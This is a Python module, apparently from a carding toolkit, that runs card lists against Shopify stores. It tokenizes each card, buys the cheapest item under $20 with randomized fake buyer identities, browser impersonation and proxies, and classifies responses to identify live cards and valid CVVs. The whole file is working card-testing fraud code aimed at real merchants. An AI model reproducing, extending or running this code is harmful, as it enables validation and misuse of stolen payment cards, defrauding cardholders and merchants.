# language: Python 3.12+, file: shopify_gate.py, target: Windows 11
# Shopify checkout gate module — direct checkout & card verification via Shopify Stores.
# Supports both modern Shopify Checkout One (GraphQL /checkouts/unstable/graphql)
# and classic Shopify checkout form POST with tokenization via deposit.us.shopifycs.com.
import argparse
import asyncio
import json
import random
import re
import sys
import uuid
from pathlib import Path
from typing import Any

from curl_cffi.requests import AsyncSession

import config
import gate_client as gc
from setup_gate import bin_lookup

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

MAX_PRICE_CENTS = 2000  # $20 default cap for Shopify items
SHOPIFY_VAULT_URLS = [
    "https://deposit.us.shopifycs.com/sessions",
    "https://deposit.shopifycs.com/sessions",
]


def bin_summary(binfo: dict) -> str:
    if not binfo:
        return "BIN n/a"
    scheme = binfo.get("scheme") or "?"
    ftype = binfo.get("type") or "?"
    country = (
        (binfo.get("country") or {}).get("alpha2")
        or (binfo.get("country") or {}).get("name")
        or "?"
    )
    bank = (binfo.get("bank") or {}).get("name") or "?"
    return f"{scheme}/{ftype}/{country} {bank}"


def _normalize_card(card_raw: str) -> dict | None:
    """Extract and validate card details, returning dict with number, mm, yy, cvc or None."""
    parsed = gc.parse_card(card_raw)
    num = parsed.get("number", "")
    if not num or not (13 <= len(num) <= 19) or not gc.check_luhn(num):
        return None
    try:
        m = int(parsed.get("mm", "0").lstrip("0") or "0")
    except ValueError:
        return None
    if not (1 <= m <= 12):
        return None
    y = parsed.get("yy", "")
    if len(y) == 2:
        y = "20" + y
    if not (len(y) == 4 and y.isdigit()):
        return None
    return {
        "number": num,
        "mm": f"{m:02d}",
        "yy": y,
        "cvc": parsed.get("cvc", "000"),
        "raw": card_raw,
    }


async def tokenize_shopify_card(s: AsyncSession, card: dict, name: str = "James Smith") -> str | None:
    """Tokenize card on Shopify Card Server (deposit.us.shopifycs.com).
    Returns vaulted session ID (e.g. 'east-xxx') or None on failure."""
    first_name, _, last_name = name.partition(" ")
    if not last_name:
        last_name = "Smith"

    payload = {
        "credit_card": {
            "number": card["number"],
            "first_name": first_name,
            "last_name": last_name,
            "month": card["mm"],
            "year": card["yy"],
            "verification_value": card["cvc"],
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }

    for url in SHOPIFY_VAULT_URLS:
        try:
            r = await s.post(url, json=payload, headers=headers, timeout=12)
            if r.status_code in (200, 201):
                data = r.json()
                sid = data.get("id")
                if sid:
                    return sid
        except Exception:
            continue
    return None


async def get_shopify_cheapest_product(
    s: AsyncSession, root: str, max_price_cents: int = MAX_PRICE_CENTS
) -> dict | None:
    """Fetch product catalog via /products.json and find cheapest available variant <= max_price_cents."""
    # limit=250: у крупных каталогов (stevemadden) дешёвые позиции за первой
    # полусотней — finder с limit=100 их видел, движок с 50 терял
    url = f"{root.rstrip('/')}/products.json?limit=250"
    try:
        r = await s.get(url, timeout=10)
        if r.status_code != 200:
            return None
        data = r.json()
        products = data.get("products", [])
        if not products:
            return None

        candidates = []
        for p in products:
            for v in p.get("variants", []):
                if v.get("available"):
                    try:
                        price_float = float(v.get("price", "999999"))
                        price_c = int(round(price_float * 100))
                        if 0 < price_c <= max_price_cents:
                            candidates.append({
                                "product_id": p.get("id"),
                                "variant_id": v.get("id"),
                                "product_title": p.get("title", ""),
                                "variant_title": v.get("title", ""),
                                "price_cents": price_c,
                                "price_str": v.get("price", "0.00"),
                                "requires_shipping": v.get("requires_shipping", True),
                            })
                    except Exception:
                        pass

        if not candidates:
            return None
        candidates.sort(key=lambda x: x["price_cents"])
        return candidates[0]
    except Exception:
        return None


def classify_shopify_verdict(raw_data: Any, context_str: str = "") -> tuple[str, str]:
    """Taxonomy classifier for Shopify Checkout responses matching config.py taxonomy.
    Maps response objects (GraphQL result, receipt, error messages, form redirects) into (verdict, detail)."""
    text = ""
    if isinstance(raw_data, dict):
        text = json.dumps(raw_data).lower()
    else:
        text = str(raw_data).lower()

    if context_str:
        text += " " + context_str.lower()

    # Success / Paid orders
    if any(k in text for k in [
        "processedreceipt", "order_paid", "order_placed", "orderstatuspageurl",
        "ordersucceeded", "thank_you", "submitsuccess", "checkout_completed",
        "/thank-you", "/orders/"
    ]):
        return "APPROVED@PAID", "Order placed / payment completed on Shopify"

    # 3D Secure / OTP Challenge
    if any(k in text for k in [
        "actionrequiredreceipt", "3d_secure", "otp_required", "card_verifications",
        "threedsecure", "three_d_secure", "authentication_required", "cauth"
    ]):
        return "3DS_REQUIRED", "3DS / OTP Challenge required by issuer"

    # Specific Card Rejection Reasons
    if "insufficient_funds" in text or "insufficient funds" in text or "not enough balance" in text:
        return "APPROVED@CVV", "Insufficient funds (Live card, CVV valid)"

    if any(k in text for k in [
        "incorrect_cvc", "invalid_cvc", "security code is incorrect",
        "security code was incorrect", "cvv_mismatch", "cvv mismatch"
    ]):
        return "APPROVED@CCN", "Incorrect CVC (Live card, PAN/expiry valid)"

    if "wrong_cvc" in text:
        return "WRONG_CVC", "Wrong security code"

    if "expired_card" in text or "card is expired" in text or "expired" in text:
        return "EXPIRED", "Card expired"

    if "stolen_card" in text or "lost_card" in text or "pickup_card" in text:
        return "DECLINED@STOLEN", "Lost or stolen card"

    if "fraudulent" in text or "fraud" in text or "risk" in text or "suspected fraud" in text:
        return "DECLINED@FRAUD", "Declined by anti-fraud filters"

    if "do_not_honor" in text or "do not honor" in text or "generic_decline" in text:
        return "DECLINED@DO_NOT_HONOR", "Declined: Do Not Honor"

    if any(k in text for k in ["invalid_number", "incorrect_number", "invalid card number", "luhn"]):
        return "INVALID", "Invalid card number / Luhn failure"

    if any(k in text for k in ["throttled", "too_many_requests", "rate_limited", "rate limit"]):
        return "RATE_LIMITED", "Rate limited by store/gateway"

    if any(k in text for k in ["checkpointdenied", "cf-turnstile-wrapper", "challenge-platform", "just a moment..."]):
        return "ERROR", "Turnstile / Cloudflare bot protection checkpoint"

    if "submitrejected" in text or "submitfailed" in text or "failedreceipt" in text or "declined" in text:
        return "DECLINED", "Card declined by Shopify Payments / Issuer"

    if "error" in text:
        return "ERROR", text[:160]

    return "UNKNOWN", text[:160]


async def shopify_confirm(
    s: AsyncSession,
    root: str,
    card_raw: str,
    country: str = "US",
    max_price_cents: int = MAX_PRICE_CENTS,
) -> dict:
    """Execute full Shopify guest checkout flow and card verification.
    Returns {status, detail, amount_cents, currency, card, target, variant_id, product_title}."""
    root = root.rstrip("/")
    card = _normalize_card(card_raw)
    if not card:
        return {
            "status": "INVALID",
            "detail": "Invalid card format or Luhn check failed",
            "amount_cents": 0,
            "currency": "",
            "target": root,
        }

    # 1. Tokenize card on Shopify Card Vault
    vault_id = await tokenize_shopify_card(s, card)
    if not vault_id:
        return {
            "status": "ERROR",
            "detail": "Failed to tokenize card on deposit.us.shopifycs.com",
            "amount_cents": 0,
            "currency": "",
            "target": root,
        }

    # 2. Get cheapest available product variant
    product = await get_shopify_cheapest_product(s, root, max_price_cents=max_price_cents)
    if not product:
        return {
            "status": "ERROR",
            "detail": f"No available product found under {max_price_cents}c cap",
            "amount_cents": 0,
            "currency": "",
            "target": root,
        }

    variant_id = product["variant_id"]
    price_cents = product["price_cents"]
    product_title = product["product_title"]

    # 3. Add to cart via /cart/add.js
    try:
        r_add = await s.post(
            f"{root}/cart/add.js",
            json={"items": [{"id": variant_id, "quantity": 1}]},
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            timeout=12,
        )
        if r_add.status_code not in (200, 201):
            # Fallback to form data
            r_add = await s.post(
                f"{root}/cart/add.js",
                data={"id": variant_id, "quantity": 1},
                timeout=12,
            )
            if r_add.status_code not in (200, 201):
                return {
                    "status": "ERROR",
                    "detail": f"Failed to add variant {variant_id} to cart (HTTP {r_add.status_code})",
                    "amount_cents": price_cents,
                    "currency": "USD",
                    "target": root,
                }
    except Exception as e:
        return {
            "status": "ERROR",
            "detail": f"cart/add.js exception: {e}",
            "amount_cents": price_cents,
            "currency": "USD",
            "target": root,
        }

    # 4. Initiate checkout via GET /checkout
    try:
        r_chk = await s.get(f"{root}/checkout", allow_redirects=True, timeout=15)
        chk_url = str(r_chk.url)
        html = r_chk.text
    except Exception as e:
        return {
            "status": "ERROR",
            "detail": f"checkout GET exception: {e}",
            "amount_cents": price_cents,
            "currency": "USD",
            "target": root,
        }

    # Check for Cloudflare / Turnstile challenges
    if any(mark in html for mark in gc.CF_CHALLENGE_MARKS):
        return {
            "status": "ERROR",
            "detail": "Cloudflare / Turnstile challenge on checkout page",
            "amount_cents": price_cents,
            "currency": "USD",
            "target": root,
        }

    # Parse metadata for modern Checkout One
    def get_meta(name: str) -> str | None:
        m = re.search(rf'name=["\']{name}["\']\s+content=["\']([^"\']+)["\']', html)
        if not m:
            m = re.search(rf'content=["\']([^"\']+)["\']\s+name=["\']{name}["\']', html)
        if m:
            val = m.group(1).replace("&quot;", '"')
            try:
                parsed = json.loads(val)
                return parsed if isinstance(parsed, str) else val
            except Exception:
                return val
        return None

    session_token = get_meta("serialized-sessionToken")
    shopify_y = get_meta("serialized-shopifyY")
    shopify_s = get_meta("serialized-shopifyS")

    first_name = random.choice(gc.FIRST_NAMES)
    last_name = random.choice(gc.LAST_NAMES)
    geo_pool = gc.GEO_POOLS.get(country, gc.GEO_POOLS["US"])
    city, region, zip_code = random.choice(geo_pool)
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 99)}@{random.choice(gc.EMAIL_DOMAINS)}"

    # 5A. Flow A: Modern Shopify Checkout One via GraphQL
    if session_token:
        mutation = """
        mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) {
          submitForCompletion(input: $input, attemptToken: $attemptToken) {
            __typename
            ... on SubmitSuccess {
              renderContextToken
              receipt {
                __typename
                ... on ProcessedReceipt {
                  id
                  orderStatusPageUrl
                  completedAt
                }
                ... on ProcessingReceipt {
                  id
                  pollDelay
                }
                ... on ActionRequiredReceipt {
                  id
                  token
                }
                ... on FailedReceipt {
                  id
                }
              }
            }
            ... on SubmittedForCompletion {
              renderContextToken
              receipt {
                __typename
                ... on ProcessedReceipt {
                  id
                  orderStatusPageUrl
                  completedAt
                }
                ... on ProcessingReceipt {
                  id
                  pollDelay
                }
                ... on ActionRequiredReceipt {
                  id
                  token
                }
                ... on FailedReceipt {
                  id
                }
              }
            }
            ... on SubmitFailed {
              reason
            }
            ... on SubmitRejected {
              sellerProposal {
                negotiatedTerms {
                  payment {
                    paymentLines {
                      paymentMethod {
                        directPaymentMethod {
                          sessionId
                        }
                      }
                    }
                  }
                }
              }
            }
            ... on CheckpointDenied {
              redirectUrl
            }
            ... on Throttled {
              pollAfter
            }
          }
        }
        """

        variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": session_token
                },
                "buyerIdentity": {
                    "email": email
                },
                "delivery": {
                    "deliveryLines": [
                        {
                            "destination": {
                                "streetAddress": {
                                    "address1": f"{random.randint(100, 999)} Main St",
                                    "city": city,
                                    "countryCode": country,
                                    "firstName": first_name,
                                    "lastName": last_name,
                                    "phone": "2125551234",
                                    "provinceCode": region
                                },
                                "postalCode": {
                                    "postalCode": zip_code
                                }
                            }
                        }
                    ]
                },
                "payment": {
                    "billingAddress": {
                        "streetAddress": {
                            "address1": f"{random.randint(100, 999)} Main St",
                            "city": city,
                            "countryCode": country,
                            "firstName": first_name,
                            "lastName": last_name,
                            "phone": "2125551234",
                            "provinceCode": region
                        },
                        "postalCode": {
                            "postalCode": zip_code
                        }
                    },
                    "paymentLines": [
                        {
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "sessionId": vault_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": f"{random.randint(100, 999)} Main St",
                                            "city": city,
                                            "countryCode": country,
                                            "firstName": first_name,
                                            "lastName": last_name,
                                            "phone": "2125551234",
                                            "provinceCode": region
                                        },
                                        "postalCode": {
                                            "postalCode": zip_code
                                        }
                                    }
                                }
                            }
                        }
                    ]
                }
            },
            "attemptToken": str(uuid.uuid4())
        }

        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "X-Checkout-One-Session-Token": session_token,
            "X-Shopify-Checkout-Session-Token": session_token,
            "X-Shopify-UniqueToken": shopify_y or "",
            "X-Shopify-VisitToken": shopify_s or "",
            "Origin": root,
            "Referer": chk_url,
        }

        try:
            r_mut = await s.post(
                f"{root}/checkouts/unstable/graphql",
                json={"query": mutation, "variables": variables},
                headers=headers,
                timeout=15,
            )
            if r_mut.status_code == 200:
                resp_json = r_mut.json()
                submit_res = (resp_json.get("data") or {}).get("submitForCompletion") or {}
                verdict, detail = classify_shopify_verdict(submit_res, context_str=json.dumps(resp_json))
                return {
                    "status": verdict,
                    "detail": detail,
                    "amount_cents": price_cents,
                    "currency": "USD",
                    "target": root,
                    "variant_id": variant_id,
                    "product_title": product_title,
                }
        except Exception as e:
            return {
                "status": "ERROR",
                "detail": f"GraphQL submission error: {e}",
                "amount_cents": price_cents,
                "currency": "USD",
                "target": root,
            }

    # 5B. Flow B: Classic Shopify multi-step checkout form POST
    auth_tokens = re.findall(r'name=["\']authenticity_token["\']\s+value=["\']([^"\']+)["\']', html)
    if not auth_tokens:
        auth_tokens = re.findall(r'value=["\']([^"\']+)["\']\s+name=["\']authenticity_token["\']', html)

    gateways = re.findall(r'name=["\']checkout\[payment_gateway\]["\']\s+value=["\']([^"\']+)["\']', html)
    if not gateways:
        gateways = re.findall(r'data-subfields-for-gateway=["\']([^"\']+)["\']', html)
    if not gateways:
        gateways = re.findall(r'value=["\']([0-9]{5,15})["\'][^>]*name=["\']checkout\[payment_gateway\]["\']', html)

    if auth_tokens and gateways:
        gw_id = gateways[0]
        token = auth_tokens[0]
        form_data = {
            "_method": "patch",
            "authenticity_token": token,
            "previous_step": "payment_method",
            "step": "",
            "s": vault_id,
            "checkout[payment_gateway]": gw_id,
            "checkout[credit_card][vault]": "default",
            "checkout[different_billing_address]": "false",
            "checkout[remember_me]": "false",
            "checkout[total_price]": str(price_cents),
            "complete": "1",
        }
        headers = {
            "Origin": root,
            "Referer": chk_url,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        try:
            r_post = await s.post(chk_url, data=form_data, headers=headers, allow_redirects=True, timeout=15)
            verdict, detail = classify_shopify_verdict(r_post.text, context_str=str(r_post.url))
            return {
                "status": verdict,
                "detail": detail,
                "amount_cents": price_cents,
                "currency": "USD",
                "target": root,
                "variant_id": variant_id,
                "product_title": product_title,
            }
        except Exception as e:
            return {
                "status": "ERROR",
                "detail": f"Classic form POST error: {e}",
                "amount_cents": price_cents,
                "currency": "USD",
                "target": root,
            }

    # If neither Checkout One sessionToken nor classic gateways were detected
    verdict, detail = classify_shopify_verdict(html, context_str=chk_url)
    return {
        "status": verdict,
        "detail": detail or "Could not find checkout session token or payment form",
        "amount_cents": price_cents,
        "currency": "USD",
        "target": root,
        "variant_id": variant_id,
        "product_title": product_title,
    }


async def check_target(
    root: str,
    card_raw: str,
    proxy: str | None = None,
    max_price_cents: int = MAX_PRICE_CENTS,
) -> dict:
    """Entry point for CLI and bot gates to check a card against a target Shopify store."""
    prefix = gc.extract_pan(card_raw)[:6]
    binfo = await bin_lookup(prefix)
    country = gc.bin_alpha2(binfo) or "US"

    async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
        res = await shopify_confirm(
            s, root, card_raw, country=country, max_price_cents=max_price_cents
        )

    res["card"] = gc.mask_pan(card_raw)
    res["bin"] = bin_summary(binfo)
    res["target"] = root
    return res


async def main():
    ap = argparse.ArgumentParser(description="Shopify checkout direct-confirm gate")
    ap.add_argument("target", help="https://store.myshopify.com (or file with URLs)")
    ap.add_argument("cards", nargs="*", help="CC|MM|YY|CVC or card list file")
    ap.add_argument("--proxy", default=None, help="HTTP/SOCKS proxy")
    ap.add_argument(
        "--max-price",
        type=int,
        default=MAX_PRICE_CENTS,
        help=f"Max item price cap in cents (default {MAX_PRICE_CENTS})",
    )
    args = ap.parse_args()

    if args.target.startswith("http"):
        targets = [args.target.rstrip("/")]
    else:
        p = Path(args.target)
        targets = [
            ln.strip().rstrip("/")
            for ln in p.read_text(encoding="utf-8").splitlines()
            if ln.strip().startswith("http")
        ]

    cards = []
    for c in args.cards:
        pp = Path(c)
        if pp.exists():
            for ln in pp.read_text(encoding="utf-8").splitlines():
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                if len(re.split(r"[|:/\s]+", ln)) >= 4:
                    cards.append(ln)
        else:
            cards.append(c)

    if not cards:
        probe = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
        cards = [f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"]
        print(f"[*] No cards given - random Luhn-valid probe: {gc.mask_pan(cards[0])}")

    print("=" * 80)
    print(f"[*] SHOPIFY DIRECT-CONFIRM GATE (paid-auth, cheapest product <= {args.max_price}c)")
    print(f"[*] Targets: {len(targets)} | Cards: {len(cards)} | Proxy: {args.proxy or 'direct'}")
    print("=" * 80)

    for t in targets:
        for card_raw in cards:
            try:
                res = await check_target(t, card_raw, args.proxy, args.max_price)
            except Exception as e:
                res = {
                    "status": "ERROR",
                    "detail": f"{type(e).__name__}: {e}"[:150],
                    "card": gc.mask_pan(card_raw),
                    "bin": "-",
                    "target": t,
                }
            status_icon = config.icon(res.get("status", "ERROR"))
            paid = (
                f" [{res['amount_cents']}c {res.get('currency', 'USD')}]"
                if res.get("amount_cents")
                else ""
            )
            print(f"{status_icon} [{res['status']:16}] {t} <- {res['card']}{paid}")
            print(f"     BIN: {res.get('bin')} | {res.get('detail', '')}")


if __name__ == "__main__":
    asyncio.run(main())
